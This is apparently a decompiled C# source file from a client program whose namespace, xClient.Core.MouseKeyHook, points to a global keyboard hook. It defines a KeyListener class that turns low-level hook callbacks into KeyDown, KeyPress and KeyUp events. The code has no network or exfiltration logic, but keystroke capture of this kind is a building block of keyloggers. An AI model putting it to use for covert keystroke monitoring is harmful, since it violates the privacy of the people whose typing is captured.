using System;
using System.Collections.Generic;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.MouseKeyHook.Implementation
{
	// Token: 0x0200005D RID: 93
	internal abstract class KeyListener : BaseListener, IKeyboardEvents
	{
		// Token: 0x06000277 RID: 631 RVA: 0x000032EB File Offset: 0x000014EB
		protected KeyListener(Subscribe subscribe) : base(subscribe)
		{
		}

		// Token: 0x14000020 RID: 32
		// (add) Token: 0x06000278 RID: 632 RVA: 0x0000DFE8 File Offset: 0x0000C1E8
		// (remove) Token: 0x06000279 RID: 633 RVA: 0x0000E020 File Offset: 0x0000C220
		public event KeyEventHandler KeyDown;

		// Token: 0x14000021 RID: 33
		// (add) Token: 0x0600027A RID: 634 RVA: 0x0000E058 File Offset: 0x0000C258
		// (remove) Token: 0x0600027B RID: 635 RVA: 0x0000E090 File Offset: 0x0000C290
		public event KeyPressEventHandler KeyPress;

		// Token: 0x14000022 RID: 34
		// (add) Token: 0x0600027C RID: 636 RVA: 0x0000E0C8 File Offset: 0x0000C2C8
		// (remove) Token: 0x0600027D RID: 637 RVA: 0x0000E100 File Offset: 0x0000C300
		public event KeyEventHandler KeyUp;

		// Token: 0x0600027E RID: 638 RVA: 0x0000E138 File Offset: 0x0000C338
		public void InvokeKeyDown(KeyEventArgsExt e)
		{
			KeyEventHandler keyDown = this.KeyDown;
			if (keyDown != null && !e.Handled && e.IsKeyDown)
			{
				keyDown(this, e);
				return;
			}
		}

		// Token: 0x0600027F RID: 639 RVA: 0x0000E168 File Offset: 0x0000C368
		public void InvokeKeyPress(KeyPressEventArgsExt e)
		{
			KeyPressEventHandler keyPress = this.KeyPress;
			if (keyPress != null && !e.Handled && !e.IsNonChar)
			{
				keyPress(this, e);
				return;
			}
		}

		// Token: 0x06000280 RID: 640 RVA: 0x0000E198 File Offset: 0x0000C398
		public void InvokeKeyUp(KeyEventArgsExt e)
		{
			KeyEventHandler keyUp = this.KeyUp;
			if (keyUp != null && !e.Handled && e.IsKeyUp)
			{
				keyUp(this, e);
				return;
			}
		}

		// Token: 0x06000281 RID: 641 RVA: 0x0000E1C8 File Offset: 0x0000C3C8
		protected override bool Callback(CallbackData data)
		{
			KeyEventArgsExt downUpEventArgs = this.GetDownUpEventArgs(data);
			IEnumerable<KeyPressEventArgsExt> pressEventArgs = this.GetPressEventArgs(data);
			this.InvokeKeyDown(downUpEventArgs);
			foreach (KeyPressEventArgsExt e in pressEventArgs)
			{
				this.InvokeKeyPress(e);
			}
			this.InvokeKeyUp(downUpEventArgs);
			return !downUpEventArgs.Handled;
		}

		// Token: 0x06000282 RID: 642
		protected abstract IEnumerable<KeyPressEventArgsExt> GetPressEventArgs(CallbackData data);

		// Token: 0x06000283 RID: 643
		protected abstract KeyEventArgsExt GetDownUpEventArgs(CallbackData data);
	}
}
